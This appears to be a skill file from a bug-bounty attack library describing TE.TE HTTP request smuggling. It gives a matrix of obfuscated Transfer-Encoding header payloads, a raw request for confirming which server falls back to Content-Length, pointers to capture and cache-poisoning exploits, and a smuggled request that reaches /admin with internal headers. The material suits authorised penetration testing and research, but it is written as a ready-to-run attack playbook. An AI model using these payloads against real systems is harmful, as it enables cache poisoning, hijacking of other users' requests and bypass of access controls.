---
name: attack-smuggling-te-te
description: "TE.TE desync — obfuscated Transfer-Encoding forms where front and back disagree on malformed TE headers; detection matrix and exploit"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - request-smuggling
  - te-te
  - obfuscation
tech_stack:
  - web
cwe_ids:
  - CWE-444
chains_with:
  - attack-request-smuggling
  - attack-cache-poison
prerequisites:
  - attack-request-smuggling
---

# TE.TE Smuggling (obfuscated TE)

## Objective

Both servers claim to honor Transfer-Encoding, but they DISAGREE on malformed
variants — one treats the mangled header as absent (falls back to CL), the other
parses it. You hunt the obfuscation form that splits their opinions.

## Methodology

### 1. Obfuscation candidates (try each; front vs back differ)

```text
Transfer-Encoding: xchunked
Transfer-Encoding : chunked            (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x                   (invalid value → ignored → CL)
Transfer-Encoding: chunked\rTransfer-Encoding: x
X: \r\nTransfer-Encoding: chunked      (header-smuggle into TE position)
Transfer-Encoding: chunked, chunked
Transfer-Encoding: cow, 5\r\nchunked    (parsing-order confusion)
Transfer-Encoding: chunked\r\nTransfer-encoding: x
Transfer-Encoding: chunked\r\n \r\nTransfer-Encoding: chunked   (space-only line)
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X:?Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n
Transfer-Encoding: chunked, chunked\r\nTransfer-Encoding: x
Transfer-Encoding: identity, chunked  (identity then chunked ordering)
Transfer-Encoding \r\n: chunked
```

### 2. Confirm which side fell back to CL

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

```

If the mangled form makes the back-end ignore TE and use CL=4 → hang (back-end waits
for 4 bytes that are already consumed as `1\r\nA`). If the FRONT ignored TE → hang
immediately on the front. Hang side = the server that fell back. Then build the
differential like cl-te/te-cl with the WORKING obfuscation form.

### 3. Exploit via the working form

Once the differential confirms desync, apply the cl-te or te-cl exploit playbook
(capture/poison/bypass) — swapping the TE header line for your obfuscated variant.
Everything else (capture paths, cache keys, length tuning) is identical.

### 4. Header-name smuggling (extra primitive)

Some front-ends strip internal headers (`X-Internal`, `X-Admin`) from client requests;
a smuggled request built INSIDE the body is rebuilt by the back-end WITH them:

```http
... body contains:
GET /admin HTTP/1.1
X-Internal: true
X-Ignore: X
```

## Proof

- Name the exact obfuscation form + the two-response differential
- The differential must use the OBFUSCATED form, not plain CL/TE — plain-form desync is
  a different finding class

## Notes

- Slow but systematic: script the candidate matrix (loop, one conn per try), stop at
  the first hang, then drill that form
